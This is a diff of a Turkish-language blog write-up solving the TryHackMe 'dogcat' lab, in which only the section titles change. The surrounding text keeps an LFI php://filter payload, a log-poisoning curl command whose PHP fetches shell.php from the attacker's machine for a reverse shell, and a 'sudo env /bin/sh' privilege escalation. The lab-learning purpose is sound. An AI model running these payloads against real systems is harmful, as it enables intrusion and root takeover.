@@ -10,7 +10,7 @@
   <meta name="author" content="order6tyfix">
   
   <meta name="description" content="Makine Linki
-RECON(Bilgi Toplama)
+RECON
 Nmap taramasıyla makineyı çözümlemeye başlıyorum.
 12345678910111213nmap -sS -sV 10.10.227.89Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-16 23:34 +03Nmap scan report for 10.10.227.89Host is up (0.15s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.38 ((Debian))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.84 seconds
 80 portunda bir apache web sunucusu var. Siteye girdiğimde dog ve cat adında iki seçenek var. Seçenekler önümüze rastgele(!) kedi veya köpek fotoğrafları çıkartıyor. URL’ye baktığım zaman LFI(Local File Inclusion)‘a müsait olabileceğini düşünüyorum çünkü web sitesin çalışma prensibi sunucudaki dosyaları çağırmak üzerine. 
@@ -148,7 +148,7 @@ var _hmt = _hmt || [];
 	  		
 
 	  <p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/dogcat">Makine Linki</a></p>
-<h1 id="RECON-Bilgi-Toplama"><a href="#RECON-Bilgi-Toplama" class="headerlink" title="RECON(Bilgi Toplama)"></a>RECON(Bilgi Toplama)</h1><hr>
+<h1 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h1><hr>
 <p>Nmap taramasıyla makineyı çözümlemeye başlıyorum.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV 10.10.227.89</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-16 23:34 +03</span><br><span class="line">Nmap scan report for 10.10.227.89</span><br><span class="line">Host is up (0.15s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.84 seconds</span><br></pre></td></tr></table></figure>
 <p>80 portunda bir apache web sunucusu var. Siteye girdiğimde dog ve cat adında iki seçenek var. Seçenekler önümüze rastgele(!) kedi veya köpek fotoğrafları çıkartıyor. URL’ye baktığım zaman <a target="_blank" rel="noopener" href="https://aycaakcay.medium.com/file-inclusion-nedir-da2f2218383f">LFI(Local File Inclusion)</a>‘a müsait olabileceğini düşünüyorum çünkü web sitesin çalışma prensibi sunucudaki dosyaları çağırmak üzerine. </p>
@@ -170,7 +170,7 @@ Warning: include(): Failed opening &#39;dog/../../../../etc/passwd.php&#39; for 
 
 <span id="more"></span>
 
-<h1 id="EXPLOITATION-Sistemi-Somurme"><a href="#EXPLOITATION-Sistemi-Somurme" class="headerlink" title="EXPLOITATION(Sistemi Sömürme)"></a>EXPLOITATION(Sistemi Sömürme)</h1><hr>
+<h1 id="EXPLOITATION"><a href="#EXPLOITATION" class="headerlink" title="EXPLOITATION"></a>EXPLOITATION</h1><hr>
 <p>Error mesajında girdiye “.php” uzantısı eklediğini fark ettim. Php için LFI tekniklerini araştırdığımda <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/file-inclusion">PHP wrappers</a>‘a denk geldim.<code>php://filter</code> kullanarak index dosyasını okuyabilir ve sitenin çalışma prensibini daha iyi anlayabilirim. Bunun için kullanacağım payload:<br></br></p>
 <pre><code>http://10.10.227.89/?view=php://filter/convert.base64-encode/resource=dog/../index
 </code></pre>
@@ -200,7 +200,7 @@ Warning: include(): Failed opening &#39;dog/../../../../etc/passwd.php&#39; for 
 <p>Bir curl isteği ile <code>shell.php</code> dosyamı sunucuya çekmem gerekiyor.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;10.10.30.6&quot; -H &quot;User-Agent: &lt;?php file_put_contents(&#x27;shell.php&#x27;,file_get_contents(&#x27;http://10.8.216.50:8000/shell.php&#x27;))?&gt;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>isteği gönderdikten sonra web tarayıcısında sayfayı yeniledim ve artık <code>shell.php</code> dosyası sunucuda. Web tarayıcısında <code>10.10.30.6/shell.php</code> sayfasına gittiğimde netcat’e reverse shell gelmiş oldu.</p>
-<h1 id="PRIV-ESC-Yetki-Yukseltme"><a href="#PRIV-ESC-Yetki-Yukseltme" class="headerlink" title="PRIV ESC(Yetki Yükseltme)"></a>PRIV ESC(Yetki Yükseltme)</h1><hr>
+<h1 id="PRIV-ESC"><a href="#PRIV-ESC" class="headerlink" title="PRIV ESC"></a>PRIV ESC</h1><hr>
 <p>İlk yapacağım şey <code>sudo -l</code> ile root yetkisi ile çalıştırabileceğim komutları listelemek.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for www-data on e6ba91bdb0c7:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on e6ba91bdb0c7:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/env</span><br></pre></td></tr></table></figure>
 <p><a href= "https://gtfobins.github.io/gtfobins/env/">GTFObins</a>‘de env için yetki yükseltme teknikleri buldum. <code>sudo env /bin/sh</code> uyguladığımda artık sistemde yetkili kullanıcıyım.</p>
